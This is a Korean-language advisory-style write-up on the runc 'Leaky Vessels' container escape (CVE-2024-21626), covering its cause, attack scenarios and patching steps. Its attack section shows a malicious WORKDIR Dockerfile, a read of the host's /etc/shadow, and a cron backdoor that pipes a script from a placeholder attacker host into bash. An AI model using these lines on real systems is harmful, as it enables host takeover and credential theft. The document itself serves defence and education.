# CVE-2024-21626 - runc Container Escape (Leaky Vessels)

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2024-21626 |
| CVSS | 8.6 (High) |
| 영향 소프트웨어 | runc (OCI 컨테이너 런타임) |
| 영향 버전 | runc 1.0.0-rc93 ~ 1.1.11 |
| 수정 버전 | runc 1.1.12 |
| 공격 유형 | Container Escape → 호스트 파일시스템 접근 |
| 발견일 | 2024-01-31 |

## 영향 범위 & 심각성

runc는 Docker, Kubernetes, Podman, containerd 등 거의 모든 컨테이너 런타임의 핵심 하위 컴포넌트다. 컨테이너 생태계 전체가 영향을 받는다.

**실제 영향:**
- Snyk 연구팀이 발견, "Leaky Vessels"로 명명 (4개 취약점 중 가장 심각)
- Docker, Kubernetes, AWS ECS, GKE, AKS 등 모든 컨테이너 플랫폼에 영향
- 악성 컨테이너 이미지 실행만으로 호스트 시스템 침해 가능
- 멀티테넌트 컨테이너 환경(CI/CD, 공유 클러스터)에서 특히 위험
- 실제 악용 보고는 제한적이나, 공격 난이도가 낮아 위험도 높음

## 취약점 기술 분석

### 근본 원인

runc가 컨테이너 초기화 과정에서 내부 파일 디스크립터(fd)를 제대로 닫지 않아, 컨테이너 내부에서 호스트의 파일시스템에 접근할 수 있다.

**메커니즘:**
1. runc가 컨테이너를 시작할 때 호스트의 `/proc/self/fd/` 디렉토리에 대한 fd를 열어둠
2. 이 fd가 컨테이너 프로세스에 "누출(leak)"됨
3. 컨테이너 내부에서 `WORKDIR` 지시문을 `/proc/self/fd/[num]`으로 설정
4. 열린 fd를 통해 호스트 파일시스템의 네임스페이스 밖으로 탈출

### 공격 벡터

```dockerfile
# 악성 Dockerfile (교육 목적)
FROM ubuntu
# /proc/self/fd/7 등이 호스트의 /sys/fs/cgroup을 가리킴
WORKDIR /proc/self/fd/7
# 컨테이너 시작 시 호스트 파일시스템에 접근 가능
```

### 핵심 문제

- **fd 누출(Leak)**: 컨테이너 격리 경계를 넘어 호스트 fd가 유지됨
- **`/proc/self/fd` 심볼릭 링크**: Linux procfs의 특성상 fd를 통해 원래 경로에 접근 가능
- **WORKDIR의 신뢰**: OCI 스펙에서 WORKDIR은 컨테이너 내부 경로로 가정하지만, `/proc` 경유로 우회

## 공격 시나리오

### 시나리오 1: 악성 컨테이너 이미지

1. 공격자가 악성 Dockerfile로 이미지를 빌드하여 레지스트리에 배포
2. 피해자(또는 CI/CD)가 해당 이미지를 pull하여 실행
3. 컨테이너 시작 시 자동으로 호스트 파일시스템 접근

### 시나리오 2: `docker exec` 악용

1. 이미 실행 중인 컨테이너에서 `/proc/self/fd/` 경로를 이용
2. `docker exec`으로 작업 디렉토리를 누출된 fd로 설정
3. 호스트 파일시스템의 민감한 파일 읽기/쓰기

### 공격 결과

```bash
# 컨테이너 내부에서 호스트 파일시스템 접근 (교육 목적)
$ ls /proc/self/fd/7/../../../etc/shadow
# → 호스트의 /etc/shadow 접근 가능!

# 호스트에 크론잡 설치로 영구 접근
$ echo "* * * * * root curl attacker.com/shell.sh | bash" > \
    /proc/self/fd/7/../../../etc/cron.d/backdoor
```

## 방어 방법

### 즉시 조치
1. **runc 1.1.12 이상으로 업그레이드**
2. Docker, containerd, Kubernetes 노드의 런타임 업데이트:
```bash
# Docker 업데이트
sudo apt update && sudo apt install docker-ce docker-ce-cli containerd.io

# runc 직접 업데이트
sudo apt install runc

# 버전 확인
runc --version
```

### Kubernetes 환경
```bash
# 노드별 runc 버전 확인
kubectl get nodes -o wide
# 각 노드에서: runc --version

# 관리형 K8s (EKS/GKE/AKS)는 클라우드 벤더 패치 확인
```

### 장기 대책
- 신뢰할 수 없는 이미지 실행 금지 (이미지 서명 검증 — Sigstore/cosign)
- Pod Security Standards에서 `privileged` 컨테이너 제한
- gVisor, Kata Containers 등 샌드박스 런타임 사용 검토
- 이미지 스캐너(Trivy, Snyk)로 빌드 파이프라인에서 취약 이미지 차단
- seccomp/AppArmor 프로파일 적용으로 시스템 콜 제한

## 교훈

1. **컨테이너 ≠ 완벽한 격리**: 컨테이너는 VM 수준의 격리를 제공하지 않음
2. **fd 관리의 중요성**: 파일 디스크립터 누출은 보안 경계를 무너뜨리는 클래식 취약점
3. **공급망 보안**: 악성 이미지를 통한 공격은 멀티테넌트 환경에서 치명적
4. **심층 방어 필요**: 런타임 취약점에 대비해 네트워크 정책, seccomp, 이미지 검증을 계층적으로 적용
5. **관리형 서비스의 패치 의존**: 클라우드 관리형 K8s에서도 런타임 패치 시점 확인 필요

## 참고 자료

- [NVD - CVE-2024-21626](https://nvd.nist.gov/vuln/detail/CVE-2024-21626)
- [Snyk Leaky Vessels 보고서](https://snyk.io/blog/leaky-vessels-docker-runc-container-breakout-vulnerabilities/)
- [runc Security Advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
- [Docker 보안 공지](https://www.docker.com/blog/docker-security-advisory-multiple-vulnerabilities-in-runc-buildkit-and-moby/)
